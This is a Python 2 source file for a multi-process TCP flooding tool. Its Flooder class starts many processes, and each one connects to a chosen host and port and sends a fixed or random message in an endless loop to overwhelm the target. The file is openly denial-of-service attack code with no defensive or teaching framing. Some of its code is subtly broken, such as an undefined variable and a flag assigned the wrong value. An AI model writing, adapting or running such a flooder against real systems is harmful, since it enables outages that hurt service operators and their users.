import socket, threading, random, time, os
from multiprocessing import Process
from Events import *
from main import *

def randomString(length):
    allowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    string = ''.join(random.choice(allowedChars) for i in xrange(length))
    return string

class TCPWorkerThread:

    def __init__(self, flooder, id):
        self.id = id
        self.socket = socket.socket()
        self.socket.setblocking(1)
        #self.socket.settimeout(flooder.timeout) #perhaps this should be blocking/nonblocking

        self.flooder = flooder
        self.running = True
        self.floodCount = 0

        if flooder.random:
            self.message = randomString(256)
        else:
            self.message = self.flooder.message

    def stop(self):
        self.running = False

    def run(self):
        while self.running:
            try:
                self.socket.connect((self.flooder.host, self.flooder.port))
                print "thread", self.id, "connected"
            except:
                time.sleep(1)
                continue
            break


        while self.running:
            try:
                self.floodCount += 1
                self.socket.send(self.message)
                if self.flooder.wait != None and self.flooder.wait != False:
                    print "thread", self.id, "sleeping for", self.flooder.wait
                    time.sleep(self.flooder.wait)
            except:
                pass

class Flooder:

    def __init__(self, host, port, timeout, method, threads, subsite = None, message = None, Random = False, wait = None):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.method = method
        self.threadsAmount = threads
        self.__threads = []
        self.__processes = []
        self.wait = wait
        self.speed = speed
        self.subsite = subsite
        self.message = message
        self.random = random
        self.threadId = 0

        if method == TCP_METHOD:
            if message == None and random == False:
                print "Message missing, not starting."
                return
        if method == UDP_METHOD or method == HTTP_METHOD:
            print "Not yet implemented, not starting."
            return

    def start(self):
        if len(self.__threads) > 0:
            return

        for x in range(self.threadsAmount):
            thread = TCPWorkerThread(self, self.threadId)
            self.__threads.append(thread)
            self.threadId += 1

            p = Process(target=thread.run)
            self.__processes.append(p)
            p.start()

    def stop(self):
        floodCount = 0

        while len(self.__processes) > 0:
            p = self.__processes.pop()
            p.terminate() #This will leave some defunct threads, but they will be reaped upon starting automatically.

        while len(self.__threads) > 0:
            t = self.__threads.pop()
            t.stop()
            floodCount += t.floodCount
        print "final floodcount:", floodCount
